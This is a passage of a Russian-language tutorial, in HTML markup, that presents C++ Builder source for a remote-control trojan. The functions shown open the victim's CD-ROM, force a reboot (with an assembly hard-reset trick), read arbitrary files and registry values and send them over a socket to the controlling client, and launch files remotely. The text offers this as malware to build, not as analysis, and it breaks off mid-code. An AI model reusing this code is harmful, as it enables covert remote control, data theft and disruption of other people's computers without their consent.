</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">Longint</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">&amp;SetParm</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        CDROMOPEN = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">false</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// закрыть</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />mciSendCommand</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">DI, MCI_CLOSE, MCI_NOTIFY, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">Longint</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">&amp;GenParm</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Выполнено открытие/закрытие CD-ROM&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Перезагрузка:  </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TTrojanUtilites::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">RestartMachine</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ExitWindowsEx</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">EWX_FORCE,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> || ExitWindowsEx</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">EWX_REBOOT,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Перезагрузка успешно выполнена.&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> <br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Вот тут я не отвечаю за все ОСи, перезагрузка-то будет, но хотелось бы сделать ее как после нажатия кнопки RESET, а так будет послано сообщение WM_...ENDSESSION etc. Короче, пробуйте сами. Могу только подкинуть основные направления поиска: смотри функции ExitWindows(), ExitWindowsEx(), InitiateSystemShutdown() и AbortSystemShutdown(). Для особо продвинутых могу предложить вариант написать надежный ребут под определенную ось и чипсет =) Например, мой прошлый комп стабильно резетился (только в Win9x, в NT не работало) следующей вставочкой:    mov dx,0cf9h mov al,2  out dx,al mov al,6 out dx,al    Откуда цифры? Читайте доки по чипсету =) Одним словом, универсального метода перезагрузить комп без WM_...ENDSESSION я не знаю. Если вы знаете - напишите пару строк, не в падлу =)    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TTrojanUtilites::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">SendFile</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">String F</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />TStringList* TTSL=</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">new</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TStringList</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />TStringList* TTSL2=</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">new</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TStringList</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">int</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> n, i;<br />TTSL-&gt;Text = F;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">!FileExists</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Файл не существует.&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">return</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />TTSL2-&gt;LoadFromFile</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">])</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// загружаем файл в TStringList</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />n = TTSL2-&gt;Count;                     </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// получаем число строк в файле</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">n &gt; StrToInt</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">1</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">     </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// если надо прочитать не весь файл</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        n = StrToInt</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">1</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">])</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// считываем только необходимое число строк</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">for</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">i=</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;iSocket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL2-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">i</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">])</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// передаем строки клиенту</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Вроде тут и объяснять нечего.    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TTrojanUtilites::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">ReadRegistry</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ShortString k</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />TRegistry* reg=</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">new</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TRegistry;<br />String res, ts;<br />TStringList* TTSL=</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">new</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TStringList;<br />HKEY k1;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// параметры передаются в следующем порядке: </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">////  0 - root key   </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">////  1 - key name</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">////  2 - value name</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">////  3 - value</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">////  4 - type of value</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />TTSL-&gt;Text = k;<br />ts = TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// выбираем RootKey</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ts == </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;HKEY_CLASSES_ROOT&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">   k1 = HKEY_CLASSES_ROOT;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ts == </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;HKEY_CURRENT_USER&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">   k1 = HKEY_CURRENT_USER;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ts == </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;HKEY_LOCAL_MACHINE&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">  k1 = HKEY_LOCAL_MACHINE;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ts == </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;HKEY_USERS&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">          k1 = HKEY_USERS;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ts == </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;HKEY_CURRENT_CONFIG&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> k1 = HKEY_CURRENT_CONFIG;<br />reg-&gt;RootKey = k1;<br />reg-&gt;OpenKey</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">1</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// открываем раздел</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />ts = TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">3</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// читаем значение параметра опредеоенного типа</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ts == </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Bool&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">   </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// двоичный  (REG_BINARY)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">reg-&gt;ReadBool</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">2</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />                res = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;true&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">else</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> res = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;false&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ts == </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Integer&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">//  числовой   (REG_DWORD)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        res = IntToStr</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">reg-&gt;ReadInteger</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">2</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">ts == </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;String&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// строковый (REG_SZ)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        res = reg-&gt;ReadString</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TTSL-&gt;Strings</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">2</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">])</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Чтение реестра. Значение параметра: &quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">+res</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// передаем клиенту значение параметра</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Запись в реестр аналогична, только используется метод WriteBool(TTSL-&gt;Strings[2], false); для записи булевского значения, WriteInteger(TTSL-&gt;Strings[2], StrToInt(TTSL-&gt;Strings[4])); - для числового, WriteString(TTSL-&gt;Strings[2], TTSL-&gt;Strings[4]); - для строкового.    Для запуска файлов на удаленном компьютере используем следующую функцию: </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TTrojanUtilites::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">ExecuteFile</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">String f</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />ShellExecute</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">GetDesktopWindow, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;open&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, f.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">c_str</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier 